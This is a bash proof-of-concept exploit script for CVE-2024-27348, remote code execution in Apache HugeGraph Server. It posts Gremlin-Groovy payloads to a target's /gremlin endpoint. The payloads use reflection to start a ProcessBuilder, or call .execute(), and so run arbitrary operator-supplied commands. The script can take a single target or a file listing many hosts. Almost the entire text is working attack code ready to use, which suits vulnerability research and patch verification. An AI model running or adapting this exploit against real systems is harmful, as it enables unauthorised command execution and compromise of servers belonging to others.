#!/bin/bash

# Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server

function exploit() {
    local target="$1"
    local command="$2"
    local url="${target}/gremlin"
    local headers="Content-Type: application/json"

    local formatted_words=$(printf '"%s", ' $command)
    formatted_words="${formatted_words%, }"

    local payload1=$(cat <<EOF
{
    "gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\\"java.lang.Thread\\");java.lang.reflect.Field field = clz.getDeclaredField(\\"name\\");field.setAccessible(true);field.set(thread, \\"WHL\\");Class processBuilderClass = Class.forName(\\"java.lang.ProcessBuilder\\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(${formatted_words});Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\\"start\\");startMethod.invoke(processBuilderInstance);",
    "bindings": {},
    "language": "gremlin-groovy",
    "aliases": {}
}
EOF
)

    local payload2=$(cat <<EOF
{
    "gremlin": "def result = \\"${command}\\".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField(result);"
}
EOF
)

    response=$(curl -s -k -X POST -H "$headers" -d "$payload1" "$url")
    handle_response "$response" "$target" "payload 1"

    response=$(curl -s -k -X POST -H "$headers" -d "$payload2" "$url")
    handle_response "$response" "$target" "payload 2"
}

function handle_response() {
    local response="$1"
    local target="$2"
    local payload="$3"

    if [[ "$response" == *'"code":200'* ]] || [[ "$response" != *"Failed to do request"* ]]; then
        echo "[+] Command executed successfully with ${payload}"
    else
        echo "[-] Request failed"
        echo "[-] Response text: ${response}"
        echo "[-] ${target} may not be vulnerable"
    fi
}

function process_targets() {
    local file="$1"
    local command="$2"
    while IFS= read -r line; do
        target=$(echo "$line" | xargs)
        exploit "$target" "$command"
    done < "$file"
}

command=""
file=""
target=""

while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -c|--command) command="$2"; shift ;;
        -f|--file) file="$2"; shift ;;
        -t|--target) target="$2"; shift ;;
        *) echo "Unknown parameter: $1" ; exit 1 ;;
    esac
    shift
done

if [[ -z "$command" ]]; then
    echo "Specify command to execute with -c/--command"
    exit 1
fi

if [[ -n "$file" ]]; then
    process_targets "$file" "$command"
elif [[ -n "$target" ]]; then
    exploit "$target" "$command"
else
    echo "Specify target with -t/--target or import targets from a file using -f/--file"
    exit 1
fi
